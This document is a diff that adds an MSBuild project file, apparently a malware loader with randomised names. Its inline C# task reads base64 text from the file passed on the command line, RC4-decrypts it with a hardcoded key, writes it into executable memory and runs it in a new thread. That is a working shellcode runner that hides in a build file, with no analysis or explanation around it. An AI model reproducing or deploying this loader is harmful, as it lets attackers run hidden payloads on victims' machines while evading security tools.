@@ -1,0 +1,126 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="scaWzEHjMEXoSSUjN">
+   <scaWzEHjMEXoSSUjN />
+   <TmGJpciT />
+   </Target>
+  <UsingTask
+    TaskName="scaWzEHjMEXoSSUjN"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+	  <Using Namespace="System.IO" />
+      <Code Type="Fragment" Language="cs">
+      </Code>
+    </Task>
+	</UsingTask>
+	<UsingTask
+    TaskName="TmGJpciT"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		using System;
+		using System.IO;
+		using System.Text;
+		using System.Management.Automation;
+		using System.Collections.Generic;
+		using System.Collections.ObjectModel;
+		using Microsoft.Build.Utilities;
+		using Microsoft.Build.Framework;
+		using System.Management.Automation.Runspaces;
+		using System.Runtime.InteropServices;
+		
+		public class TmGJpciT :  Task, ITask {	
+			private static UInt32 PFZAFInvo = 0x1000;
+			private static UInt32 scnPEJnQkNkRlbYgmJWUdAKe = 0x40;
+			[DllImport("kernel32")]
+			private static extern UInt32 VirtualAlloc(UInt32 txjMVwoaQSctxoclRVUUVML, UInt32 GwyHBGSjFAijGOsz, UInt32 ifuVflj, UInt32 nmtFAoxZHtzEwytsOaN);
+			[DllImport("kernel32")]
+			private static extern UInt32 WaitForSingleObject(IntPtr kEoYurJd, UInt32 iiPmACuXdWFzIGSozLX);
+			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+			private delegate IntPtr qMTeoTQQhounXh(IntPtr kcZkuXKiLyPhWI, UInt32 qMTeoTQQhounXh, IntPtr scaWzEHjMEXoSSUjN, IntPtr nmtFAoxZHtzEwytsOaN, UInt32 PFZAFInvo, ref UInt32 YwKQOXFgkbcdmmjedVjYDG);
+			[DllImport("kernel32.dll")]
+			public static extern IntPtr LoadLibrary(string iiPmACuXdWFzIGSozLX);
+			[DllImport("kernel32.dll")]
+			public static extern IntPtr GetProcAddress(IntPtr zOocgnFkx, string YwKQOXFgkbcdmmjedVjYDG);
+
+			public override bool Execute() {
+				string[] EiRZzbByStUwCVLfLpGVM = Environment.GetCommandLineArgs();
+			
+				StreamReader gUYnglfoGIFM = File.OpenText(EiRZzbByStUwCVLfLpGVM[1]);
+				StringBuilder kcZkuXKiLyPhWI = new StringBuilder();
+				string nmtFAoxZHtzEwytsOaN;
+				while((nmtFAoxZHtzEwytsOaN = gUYnglfoGIFM.ReadLine()) != null) {
+						if(String.Equals(nmtFAoxZHtzEwytsOaN, "-->")) {
+							byte[] IQeLEkWj = {0x51, 0xcb, 0x34, 0xf9, 0xf8, 0x01, 0xf6, 0x98, 0x66, 0x84, 0x5d, 0x83, 0x86, 0xd0, 0x7d, 0x09, 0x49, 0xc3, 0x21, 0x0c, 0x4b, 0x11, 0xf8, 0x9e, 0x2c, 0x0c, 0xb6, 0x67, 0xac, 0x1e, 0x6a, 0x01};
+							byte[] vhuvEa = Convert.FromBase64String(kcZkuXKiLyPhWI.ToString());
+							byte[] bGZrrEGNiojlHHeg = ifuVflj.ilwEQcqsXzvjEkL(IQeLEkWj, vhuvEa);
+
+							IntPtr BbbKxcmZ = LoadLibrary("kernel32.dll");
+                					IntPtr DANDaPDc = GetProcAddress(BbbKxcmZ, "CreateThread");
+               						qMTeoTQQhounXh RTfbiUYeLtJOSaKLYMg = (qMTeoTQQhounXh)Marshal.GetDelegateForFunctionPointer(DANDaPDc, typeof(qMTeoTQQhounXh));
+						
+							UInt32 TQJmyHCUulFMnCgd = VirtualAlloc(0, (UInt32)bGZrrEGNiojlHHeg.Length, PFZAFInvo, scnPEJnQkNkRlbYgmJWUdAKe);
+							Marshal.Copy(bGZrrEGNiojlHHeg, 0, (IntPtr)(TQJmyHCUulFMnCgd), bGZrrEGNiojlHHeg.Length);
+							IntPtr hoYcgoYKOwp = IntPtr.Zero;
+							IntPtr xBJAgpoERlSmbCfxN = IntPtr.Zero;
+							UInt32 QOcAudw = 0;
+							hoYcgoYKOwp = RTfbiUYeLtJOSaKLYMg(IntPtr.Zero, 0, (IntPtr)TQJmyHCUulFMnCgd, xBJAgpoERlSmbCfxN, 0, ref QOcAudw);
+							WaitForSingleObject(hoYcgoYKOwp, 0xFFFFFFFF);
+							return true;
+						}
+						if(!String.Equals(nmtFAoxZHtzEwytsOaN, "<!--")) {
+							kcZkuXKiLyPhWI.AppendLine(nmtFAoxZHtzEwytsOaN);
+						}
+				}
+				return true;
+			}
+		}
+		
+		public class ifuVflj {
+			public static byte[] iiPmACuXdWFzIGSozLX(byte[] dGUoHNj, byte[] vkIjlbTzqWBAsLAUv) {
+				int tAoxmKZTtGhyphANfIgipH, txjMVwoaQSctxoclRVUUVML, kPwMxWAkKhjyLnk, uHFrspdiwFCHgAOfMdFRJT, bIDjkqySnzYcF;
+				int[] TjkBseyFtrDiyTPGOZHqF, YwKQOXFgkbcdmmjedVjYDG;
+				byte[] WKjcLGaEXRjOauEqNutx;
+
+				TjkBseyFtrDiyTPGOZHqF = new int[256];
+				YwKQOXFgkbcdmmjedVjYDG = new int[256];
+				WKjcLGaEXRjOauEqNutx = new byte[vkIjlbTzqWBAsLAUv.Length];
+
+				for (txjMVwoaQSctxoclRVUUVML = 0; txjMVwoaQSctxoclRVUUVML < 256; txjMVwoaQSctxoclRVUUVML++) {
+					TjkBseyFtrDiyTPGOZHqF[txjMVwoaQSctxoclRVUUVML] = dGUoHNj[txjMVwoaQSctxoclRVUUVML % dGUoHNj.Length];
+					YwKQOXFgkbcdmmjedVjYDG[txjMVwoaQSctxoclRVUUVML] = txjMVwoaQSctxoclRVUUVML;
+				}
+				for (kPwMxWAkKhjyLnk = txjMVwoaQSctxoclRVUUVML = 0; txjMVwoaQSctxoclRVUUVML < 256; txjMVwoaQSctxoclRVUUVML++) {
+					kPwMxWAkKhjyLnk = (kPwMxWAkKhjyLnk + YwKQOXFgkbcdmmjedVjYDG[txjMVwoaQSctxoclRVUUVML] + TjkBseyFtrDiyTPGOZHqF[txjMVwoaQSctxoclRVUUVML]) % 256;
+					bIDjkqySnzYcF = YwKQOXFgkbcdmmjedVjYDG[txjMVwoaQSctxoclRVUUVML];
+					YwKQOXFgkbcdmmjedVjYDG[txjMVwoaQSctxoclRVUUVML] = YwKQOXFgkbcdmmjedVjYDG[kPwMxWAkKhjyLnk];
+					YwKQOXFgkbcdmmjedVjYDG[kPwMxWAkKhjyLnk] = bIDjkqySnzYcF;
+				}
+				for (tAoxmKZTtGhyphANfIgipH = kPwMxWAkKhjyLnk = txjMVwoaQSctxoclRVUUVML = 0; txjMVwoaQSctxoclRVUUVML < vkIjlbTzqWBAsLAUv.Length; txjMVwoaQSctxoclRVUUVML++) {
+					tAoxmKZTtGhyphANfIgipH++;
+					tAoxmKZTtGhyphANfIgipH %= 256;
+					kPwMxWAkKhjyLnk += YwKQOXFgkbcdmmjedVjYDG[tAoxmKZTtGhyphANfIgipH];
+					kPwMxWAkKhjyLnk %= 256;
+					bIDjkqySnzYcF = YwKQOXFgkbcdmmjedVjYDG[tAoxmKZTtGhyphANfIgipH];
+					YwKQOXFgkbcdmmjedVjYDG[tAoxmKZTtGhyphANfIgipH] = YwKQOXFgkbcdmmjedVjYDG[kPwMxWAkKhjyLnk];
+					YwKQOXFgkbcdmmjedVjYDG[kPwMxWAkKhjyLnk] = bIDjkqySnzYcF;
+					uHFrspdiwFCHgAOfMdFRJT = YwKQOXFgkbcdmmjedVjYDG[((YwKQOXFgkbcdmmjedVjYDG[tAoxmKZTtGhyphANfIgipH] + YwKQOXFgkbcdmmjedVjYDG[kPwMxWAkKhjyLnk]) % 256)];
+					WKjcLGaEXRjOauEqNutx[txjMVwoaQSctxoclRVUUVML] = (byte)(vkIjlbTzqWBAsLAUv[txjMVwoaQSctxoclRVUUVML] ^ uHFrspdiwFCHgAOfMdFRJT);
+				}
+				return WKjcLGaEXRjOauEqNutx;
+			}
+
+			public static byte[] ilwEQcqsXzvjEkL(byte[] OpmJcAmCYeby, byte[] ovCgGq) {
+				return iiPmACuXdWFzIGSozLX(OpmJcAmCYeby, ovCgGq);
+			}
+		}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
